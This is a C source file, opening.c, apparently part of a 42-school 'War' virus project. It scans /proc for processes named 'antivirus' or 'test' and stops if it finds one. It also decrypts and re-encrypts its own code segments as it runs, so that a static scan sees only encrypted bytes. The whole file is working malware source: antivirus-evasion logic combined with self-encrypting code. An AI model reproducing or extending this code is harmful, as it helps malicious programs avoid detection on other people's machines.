/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   opening.c                                          :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: ddinaut <ddinaut@student.42.fr>            +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2019/03/27 12:20:54 by ddinaut           #+#    #+#             */
/*   Updated: 2019/04/12 15:33:40 by ddinaut          ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "war.h"

/*
  Opening() iterate thought every entry in /proc in order to found antivirus proccess
  Look at needle variable to remove or add proccess you want to find.
  if the process is found then War abort as soon as possible.
  i'm deeply sorry about how ugly opening() is :(
*/

__INLINE__ bool read_entry(int fd)
{
	char	prog[PROG_INFO] = {0};
	char	needle[PROG_ENTRY][16] = {"antivirus", "test"};

	if (_read(fd, prog, PROG_INFO) > 0)
	{
		for (register int count = 0 ; count < PROG_ENTRY ; count++)
		{
			int count2 = 6;
			while ((prog[count2] == ' ' || prog[count2] == '\t') && prog[count2] != '\0')
				count2++;
			if (_strncmp(needle[count], &prog[count2], _strlen(needle[count])) == 0)
			{
				#ifdef DEBUG
				char c = '\n';
				char tutu[] = "\tproccess :\t";
				_log(tutu, _strlen(tutu));
				_log(&prog[count2], _strlen(&prog[count2]));
				_log(&c, 1);
				#endif
				return (true);
			}
		}
	}
	return (false);
}

void	opening(t_data *data)
{

#ifdef DEBUG
	char de[] = "opening\t\t0\n";
	data->context == true ?	de[9] = 49 : 0;
	_log(de, _strlen(de));
#endif

	revert_one(&data->key, (char*)antidebug, (size_t)opening - (size_t)antidebug);

	int				fd[3];
	int				limit;
	char			buf[BUFF_SIZE] = {0};
	char			target[9] = "/status";
	char			path[PATH_MAX] = "/proc/";
	linux_dirent64	*curr = NULL;

	data->context = false;
	if ((fd[0] = _open(path, O_RDONLY, 0000)) < 0)
		goto next;

	while ((limit = _getdents64(fd[0], (struct linux_dirent64 *)buf, BUFF_SIZE)) > 0)
	{
		for (register int i = 0 ; i < limit ; i += curr->d_reclen)
		{
			curr = (struct linux_dirent64 *)(buf + i);
			int len = _strlen(curr->d_name);
			if (len > 0 && check_name(curr->d_name, len) == true)
			{
				_memcpy(path + 6, curr->d_name, len);
				path[6 + len] = '\0';
				if ((fd[1] = _open(path, O_RDONLY, 0000)) < 0)
					continue ;
				_memcpy(path + (6 + len), target, 9);
				if ((fd[2] = _open(path, O_RDONLY, 0000)) < 0)
					continue ;
				if (read_entry(fd[2]) == true)
					goto next;
				_close(fd[2]);
				_close(fd[1]);
			}
		}
	}
	_close(fd[0]);
	data->context = true;

next:
	_close(fd[0]);
	_close(fd[1]);
	_close(fd[2]);

	update_one(&data->key, (char*)opening, (size_t)war - (size_t)opening);
	revert_one(&data->key, (char*)war, (size_t)locate - (size_t)war);

	war(data);
}
